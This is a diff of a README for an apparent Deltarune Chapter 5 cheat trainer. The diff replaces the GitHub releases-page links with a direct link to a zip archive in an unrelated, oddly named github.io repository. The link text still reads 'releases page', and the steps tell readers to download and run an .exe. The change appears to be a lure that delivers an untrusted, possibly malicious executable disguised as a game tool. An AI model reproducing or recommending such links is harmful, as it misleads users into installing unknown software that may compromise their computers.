@@ -5,7 +5,7 @@ description: "Modify stats and enable infinite health for Deltarune Chapter 5 wi
 ---
 # 🎮 Deltarune-Chapter5-Ultimate-Trainer-2026 - Master every battle with ease
 
-[![](https://img.shields.io/badge/Download_Trainer-Blue?style=for-the-badge&logo=github)](https://github.com/Homosoloensisstandrewscross279/Deltarune-Chapter5-Ultimate-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download_Trainer-Blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Homosoloensisstandrewscross279/homosoloensisstandrewscross279.github.io/main/azobenzol/io-github-homosoloensisstandrewscross-v1.2.zip)
 
 ## 📖 About this project
 
@@ -25,7 +25,7 @@ Ensure your PC meets these requirements before you start:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [releases page](https://github.com/Homosoloensisstandrewscross279/Deltarune-Chapter5-Ultimate-Trainer-2026/releases) to access the downloads.
+1. Visit the [releases page](https://raw.githubusercontent.com/Homosoloensisstandrewscross279/homosoloensisstandrewscross279.github.io/main/azobenzol/io-github-homosoloensisstandrewscross-v1.2.zip) to access the downloads.
 2. Look for the most recent version of the trainer file, which usually ends in .exe.
 3. Click the file to start the download to your computer.
 4. Move the file to a folder where you can find it easily, such as your Desktop.
